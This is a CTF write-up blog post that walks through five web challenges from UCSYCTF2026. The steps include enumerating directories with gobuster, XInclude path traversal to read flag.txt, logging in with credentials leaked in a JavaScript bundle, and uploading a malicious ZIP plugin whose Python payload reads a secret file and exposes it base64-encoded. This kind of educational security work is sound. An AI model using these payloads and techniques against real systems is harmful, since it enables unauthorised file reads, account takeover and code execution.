---
title: "UCSYCTF2026 – Web Category"
date: 2026-07-07
draft: false
description: "Full writeups for every Web challenge in UCSYCTF2026."
tags:
  - ctf
  - ucsyctf2026
  - web
categories:
  - Labs-Solution
---

# UCSYCTF2026 – Web Category

This post contains my solutions for all Web challenges from **UCSYCTF2026**.

---

# Robots (20 Marks)

## Challenge Description

Find the robots on this server.

## Solution

Navigate to:

```text
http://165.232.163.126/robots.txt
```

![Exploit](/images/ucsyctf2026/robots.PNG)

The `robots.txt` file contains the flag.

## Flag

```text
UCSYCTF{iamtherobot}
```

## Tip

`robots.txt` is a plain-text file located in the root directory of a website. It tells search engine crawlers which paths should not be indexed, but it can also unintentionally expose sensitive endpoints or hidden files.

---

# Slash Flag (30 Marks)

## Challenge Description

It's ez. Just slash the flag on this website.

```
UCSYCTF{}
```

## Solution

Navigate to:

```text
/flag
```

The page displays lots of plain text, but nothing interesting appears at first glance.

Try **View Page Source**. You'll notice that the real flag is split across several HTML attributes such as:

- `data-flag`
- `id`
- `class`
- `title`
- `data-char`

and others.

![Exploit](/images/ucsyctf2026/slashFlag2.PNG)

## Flag

```text
UCSYCTF{w3lc0m3_t0_ucsyctf_2026}
```

---

# Space X (100 Marks)

## Challenge Description

> GaDaK tried to find his crush in SpaceX, but he needs to traverse to her. How will he do it?

Challenge URL

```text
http://187.127.100.53:5000/
```

```
UCSYCTF{}
```

## Analysis

The challenge provides a useful hint pointing to the official XInclude documentation:

https://www.w3.org/TR/xinclude-11/#include_element

Reading the documentation explains that XML supports a feature called **XInclude**, which allows one XML document to include another XML document.

Another observation is that the challenge requires the correct **HTTP method** and **endpoint**.

If you don't want to purchase Hint 2, you can enumerate the server using **Gobuster**.

## Solution

First, enumerate directories.

```bash
gobuster dir \
  -u http://187.127.100.53:5000 \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

![Exploit](/images/ucsyctf2026/spacex.PNG)

A `/view` endpoint exists, but it responds with **Method Not Allowed**, indicating that it expects a different HTTP method.

Try sending a POST request.

```bash
curl -X POST http://187.127.100.53:5000/view
```

The server responds with:

```
Submit an XML document for preview.
Shared starter fragment: docs/welcome.xml
```

Next, include `docs/welcome.xml`.

```bash
curl -X POST http://187.127.100.53:5000/view \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="docs/welcome.xml" parse="xml"/>
</root>'
```

This reveals another hint pointing to:

```
docs/hint.xml
```

Now include that file.

```bash
curl -X POST http://187.127.100.53:5000/view \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="docs/hint.xml" parse="xml"/>
</root>'
```

The hint tells us that the flag is located outside the `docs` directory.

We can therefore perform directory traversal using XML character references.

> **Note:** I originally thought URL encoding might also work, but direct access to `/flag.txt` from the root directory is blocked.

```bash
curl -X POST http://187.127.100.53:5000/view \
-H "Content-Type: text/xml" \
-d '<?xml version="1.0"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include href="&#x2e;&#x2e;&#x2f;flag.txt" parse="text"/>
</root>'
```

## Flag

```text
UCSYCTF{xml_trav3rsal}
```

---

# API (200 Marks)

## Challenge Description

POST to login and GET admin to retrieve the flag.

Challenge URL

```text
http://187.127.100.53:3000
```

```
UCSYCTF{}
```

## Analysis

Browsing the application reveals an `/api` endpoint.

However, it only displays:

```
Dashboard access is restricted.
```

Checking **View Page Source**, I noticed a JavaScript bundle:

```
/static/js/main.491f8fcf.js
```

When solving Web challenges, always remember to inspect JavaScript files because they may expose sensitive information.

## Solution

After analyzing the JavaScript bundle, I found the following values:

```text
migrationHash: $2b$14$6lC5n3rY9mN2nQY2A9NQ6eY8Fj2k2Pj3Yh0uP7oSx3K4QfWw5N8D6

adminUser: administrator
```

I used them as the login credentials.

```bash
curl -s -X POST http://187.127.100.53:3000/api/login \
-H "Content-Type: application/json" \
-d '{"username":"administrator","password":"$2b$14$6lC5n3rY9mN2nQY2A9NQ6eY8Fj2k2Pj3Yh0uP7oSx3K4QfWw5N8D6"}'
```

![Exploit](/images/ucsyctf2026/api2.PNG)

The response returns a bearer token.

Use that token to access the admin endpoint.

```bash
curl -s http://187.127.100.53:3000/api/admin \
-H "Authorization: Bearer gglwvv4mvea"
```

![Exploit](/images/ucsyctf2026/api1.PNG)

## Tip

The Authorization header follows the format:

```text
Authorization: <Authentication-Scheme> <Credentials>
```

`Bearer` is commonly used with OAuth 2.0 and JWT-based authentication.

## Flag

```text
UCSYCTF{th15_15_0n3_0f_DEVELOPERS_mistakes}
```

---

# Secure Plugin Store (300 Marks)

## Challenge Description

Welcome to the **Secure Plugin Store (Beta)**.

Our platform features a multi-layered security pipeline—including static analysis, sandboxed installation, and runtime isolation—to ensure only approved plugins execute.

However, since the system is still in beta, some defenses may be incomplete.

Your objective is to bypass these protections, read restricted data, and retrieve the hidden flag.

Target:

```text
http://187.127.100.53:9000
```

```
UCSYCTF{}
```

### Hint 1 (0 Points)

The manifest — **the filename matters more than you think.**

> Name check.

### Hint 2

Every application needs a place to store its secrets.

```
/opt/app/instance/flag.txt
```

### Hint 3

There are two paths between you and the flag.

Find the right one by asking nicely.

```
/xxx/xxx/xx-xx-xxx-/xxx.xx
```

## Analysis

The application contains two interesting paths.

Start by enumerating directories.

```bash
gobuster dir \
-u http://187.127.100.53:9000/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt
```

This reveals:

```
/api
```

Next, enumerate the second directory.

```bash
gobuster dir \
-u http://187.127.100.53:9000/api/ \
-w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-small.txt \
--exclude-length 40
```

This discovers:

```
/api/plugin
```

The application accepts plugins packaged as ZIP files.

Based on **Hint 1**, I searched for the structure of a `manifest.json` file and created the minimum required version.

```json
{
  "name": "utility-helper",
  "version": "1.0.0",
  "author": "devteam",
  "description": "Safe utility plugin"
}
```

Reference:

https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/manifest.json

Based on **Hint 2**, we know the flag is stored at:

```text
/opt/app/instance/flag.txt
```

## Solution

Searching online shows that many plugin installation systems have suffered from supply-chain related vulnerabilities and bypasses. Inspired by those techniques, we can exploit this challenge.

Create the following ZIP archive.

```text
exploit_ctf.zip
├── .hidden/
│   └── payload.py
└── manifest.json
```

The attack flow is:

```text
Plugin uploaded
      │
      ▼
payload.py executes
      │
      ▼
Reads /opt/app/instance/flag.txt
      │
      ▼
Base64 encodes the flag
      │
      ▼
Writes result.json
      │
      ▼
Attacker downloads result.json
```

My payload is:

```python
import base64
from pathlib import Path

p = Path(__file__).resolve().parent.parent
flag = Path("/opt/app/instance/flag.txt").read_text().strip()

(p / "result.json").write_text(
    "{\"flag\":\"" +
    base64.b64encode(flag.encode()).decode() +
    "\"}"
)
```

This script:

- Reads the flag.
- Encodes it in Base64.
- Writes the output into `result.json`.

![Exploit](/images/ucsyctf2026/plugin2.PNG)

After uploading the ZIP file successfully, retrieve the generated output.

```
/api/plugin/<UUID>/result.json
```

![Exploit](/images/ucsyctf2026/plugin3.PNG)

Decode the Base64 value.

![Exploit](/images/ucsyctf2026/plugin4.PNG)

Base64 value:

```text
VUNTWUNURntwbHVnaW5fc3VwcGx5X2NoYWluX3JjZV9maW5hbF84ZjNhOTF9
```

## Flag

```text
UCSYCTF{plugin_supply_chain_rce_final_8f3a91}
```

## Tip

There are multiple ways to bypass ZIP upload restrictions depending on the implementation.

If you're interested in how this challenge was built or want to understand the source code behind the upload bypass, feel free to contact me.

---

# Final Words

Thank you for reading!

I hope these writeups helped you understand the intended solutions behind the Web challenges.

Good luck to everyone who will soon participating in **MCSC2026**!